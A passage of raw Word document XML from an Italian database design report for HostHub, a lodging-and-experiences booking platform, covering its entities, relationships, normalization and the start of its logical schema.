        <w:t>Nel database effettivo non risulta una tabella separata denominata Guest. Il ruolo di ospite è rappresentato implicitamente dall’utente che effettua prenotazioni di alloggi o esperienze. Questa scelta semplifica il modello, perché evita una tabella aggiuntiva priva di attributi specifici.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5B7D02" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Scelte progettuali principali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D769E1" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Utente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2805A066" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta la persona registrata alla piattaforma. Conserva i dati comuni a tutti gli utenti, come nome, cognome, email, password hash, telefono e data di registrazione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE743B7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151DBB72" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta un utente che può pubblicare e gestire alloggi. È modellato come specializzazione di Utente, perché non è un soggetto separato ma un utente con funzionalità aggiuntive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30ACB08C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Alloggio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFDC42C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta gli immobili pubblicati dagli host. Contiene titolo, descrizione, indirizzo, prezzo per notte, capienza, tipo di alloggio, numero di camere, letti e bagni. È collegato a un host e a una città.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015BB99C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Agenzia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EC3F42" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta un soggetto che propone esperienze turistiche. È distinta dall’host perché non gestisce alloggi, ma organizza attività prenotabili.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2043998D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Esperienze</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C667B9B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresentano attività prenotabili dagli utenti, come tour o attività locali. Sono collegate a un’agenzia e contengono prezzo, durata, categoria, capienza massima e luogo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A0CACA" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Prenotazione_Alloggio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D908D49" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta la prenotazione di un alloggio da parte di un utente. Contiene check-in, check-out, numero di ospiti, prezzo totale, stato e codice di conferma.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D89048F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Prenotazione_Esperienze</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C80B006" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta la prenotazione di un’esperienza. È separata dalla prenotazione degli alloggi perché usa attributi diversi, come data dell’esperienza e numero di partecipanti.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FEDBA5B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Recensione_Alloggio e Recensione_Esperienze</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E132FA4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Sono due entità separate perché valutano oggetti diversi. Entrambe contengono voto, commento e data, ma sono collegate a prenotazioni diverse.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211786B7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Servizio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E97CFAF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta i servizi offerti dagli alloggi. La relazione molti-a-molti con Alloggio è gestita dalla tabella associativa offre.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41071EB4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Badge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4931A6B9" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta riconoscimenti assegnati agli host. La relazione con Host è molti-a-molti ed è gestita da ottiene, che contiene anche la data di ottenimento.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D5DE0D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Citta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B46034" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Permette di localizzare gli alloggi e raggrupparli geograficamente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDB8FAB" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Punti_Interesse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2378CC" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rappresenta luoghi rilevanti presenti in una città, utili per mostrare cosa si trova nei dintorni di un alloggio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADE169B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Relazioni</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>principali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2592"/>
        <w:gridCol w:w="6768"/>
      </w:tblGrid>
      <w:tr w:rsidR="00597ADF" w14:paraId="7A1C29D5" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="251612C0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Relazione</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="5ADA0C71" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Motivazione progettuale</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="2724C170" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="257DC7F7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Host - Alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="656D24AC" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un host gestisce uno o più alloggi. La relazione permette di identificare il responsabile di ogni immobile.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="0C596CB5" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="481DAF31" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Alloggio - Citta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35D6CBE9" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un alloggio appartiene a una città. Questo consente ricerche per destinazione e viste sulle top destinazioni.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="473A6F62" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5DAC2508" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Citta - Punti_Interesse</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30159679" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Una città contiene punti di interesse. La relazione arricchisce le informazioni territoriali sugli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="122D7067" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27CFCAC2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Alloggio - Servizio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69A24B3E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un alloggio offre più servizi e un servizio può comparire in più alloggi. La relazione è gestita tramite offre.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="263657C6" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="743DE1F4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Utente - Prenotazione_Alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="051232DF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un utente può effettuare prenotazioni di alloggi. La prenotazione conserva il riferimento all’utente e all’alloggio.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="39B53768" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DD21AB4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Utente - Prenotazione_Esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="505721B7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un utente può prenotare esperienze. La separazione dagli alloggi evita campi non pertinenti.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="5B7FCC1C" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="781B6705" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Prenotazione - Recensione</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4E4C2DA4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Una prenotazione può generare una recensione. Il collegamento garantisce che la recensione sia legata a un servizio effettivamente prenotato.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="7B888319" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="50C63EB7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agenzia - Esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6060C593" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un’agenzia fornisce esperienze. Il collegamento consente dashboard e profili agenzia.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="5047444E" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3F1A4919" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Host - Badge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E731706" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Un host può ottenere più badge. La tabella ottiene conserva anche la data di assegnazione.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59143961" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6. Normalizzazione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EA1E4B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Lo schema relazionale di HostHub risulta progettato con attenzione alla normalizzazione. L’obiettivo è ridurre ridondanze inutili, evitare anomalie di inserimento o aggiornamento e mantenere una struttura leggibile.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B991E33" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Prima forma normale (1FN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C288D93" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Le tabelle sono in prima forma normale perché gli attributi sono atomici. I servizi, le lingue e i badge non sono memorizzati come liste </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dentro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>una</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>singola</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>colonna</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, ma </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sono</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rappresentati</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tramite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>entità</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>autonome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tabelle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> associative.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACC34C4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Seconda </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>forma</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> normale (2FN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3711207D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Lo schema è in seconda forma normale perché, oltre a rispettare la 1FN, le tabelle con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>chiavi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>composte</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> non </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>presentano</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attributi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>che</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dipendono</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> solo da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>una</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>parte</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> della </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>chiave</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. La tabella ottiene aggiunge la data di ottenimento, che dipende dalla coppia host-badge.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27183ACC" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Terza forma normale (3FN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6794605A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Le tabelle principali sono organizzate in modo da evitare dipendenze transitive evidenti. Per esempio, i dati della città non sono duplicati nella tabella alloggio, ma sono memorizzati nella tabella citta e collegati tramite id_citta. Allo stesso modo, i servizi sono memorizzati nella tabella servizio e collegati agli alloggi tramite offre.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42413808" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La separazione tra alloggi ed esperienze, tra le rispettive prenotazioni e tra le rispettive recensioni contribuisce alla chiarezza del modello. Evita una tabella unica troppo generica e permette di usare attributi specifici per ogni caso.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0F74DB" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Modello logico</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B02C940" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Di seguito viene riportata una rappresentazione sintetica del modello logico. Gli attributi indicati dopo i due punti rappresentano chiavi esterne verso le tabelle di riferimento.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EF9855" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>UTENTE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_utente, nome, cognome, email, password_hash, telefono, data_registrazione)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B3C6EC" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>HOST(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">id_host: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>UTENTE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_utente), descrizione_profilo, data_attivazione)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E347F8" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
